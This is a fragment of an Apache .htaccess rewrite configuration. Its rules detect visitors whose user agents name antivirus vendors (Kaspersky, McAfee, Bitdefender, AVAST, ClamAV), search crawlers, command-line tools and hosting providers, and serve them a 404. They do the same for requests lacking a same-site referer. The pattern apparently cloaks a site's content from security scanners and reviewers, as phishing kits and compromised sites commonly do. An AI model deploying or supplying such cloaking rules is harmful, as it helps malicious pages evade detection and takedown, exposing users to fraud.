RewriteCond %{HTTP_USER_AGENT} ^.*(alert|proxy|scan|archiver|Preview|Craw|PTSD|wget|perl|curl|Gomez|DMBrowser|RuxitSynthetic|click|labs|Clam|Lighthouse|check|link|python|X11|CriOS|Spider|Google|yahoo|bot|Amazon|InfoRelay|Eurafibre|SAS|Bitdefender|AVAST|McAfee|Kaspersky|OVH|Leaseweb|DigitalOcean|China|SoftLayer|Cyren|Defense|compatible).*$ [NC,OR]
RewriteCond %{REQUEST_URI} \.(html|js|php|htaccess)$
RewriteCond %{HTTP_HOST}@@%{HTTP_REFERER} !^([^@]*)@@https?://\1/.* [OR]
RewriteCond %{REQUEST_METHOD} POST
RewriteCond %{HTTP_HOST}@@%{HTTP_REFERER} !^([^@]*)@@https?://\1/.*

RewriteRule ^(.*) home.html [R=404,L]
</IfModule>


